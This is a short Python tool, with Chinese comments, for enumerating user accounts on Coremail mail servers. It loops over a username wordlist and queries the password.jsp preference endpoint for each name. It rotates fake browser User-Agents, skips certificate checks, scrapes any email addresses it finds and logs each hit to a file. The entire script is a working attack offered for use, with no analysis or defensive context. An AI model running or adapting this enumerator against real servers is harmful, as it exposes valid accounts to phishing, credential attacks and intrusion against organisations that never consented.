#coding = utf-8
import requests
import sys
import re
import random
import urllib3
import datetime
start = datetime.datetime.now() 
print("""
#-------------------coremail枚举小脚本---------------------#
                                                    by:whitekami@foxmail.com
    """)
urllib3.disable_warnings()#取消证书警告
#proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
user_agent = [
    'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30',
    'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)',
    'Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.9.168 Version/11.50',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'
]
headers = {
    "User-Agent": random.choice(user_agent),
    "Content-Type":"application/x-www-form-urlencoded"
}
url1 = sys.argv[1]
data = []
for line in open('user2.txt','r'):
    line=line.rstrip("\n")#去除回车
    if line.strip():
        url = url1+"/coremail/XPS/pref/password.jsp?uid=%s"%(line)
        #r = requests.get(url=url,proxies=proxies,headers=headers,verify=False)
        r = requests.get(url=url,headers=headers,verify=False)
        html = r.text
        pattern =re.findall(r'([a-zA-Z0-9_.+-]+@[a-pr-zA-PRZ0-9-]+\.[a-zA-Z0-9-.]+)',html)
        for t in pattern:
            print('枚举成功:',t)
            fo = open('ok.txt', "ab+")
            fo.write((t+'\n').encode('UTF-8'))
            fo.close()
            end = datetime.datetime.now()
            print('共用时',end-start)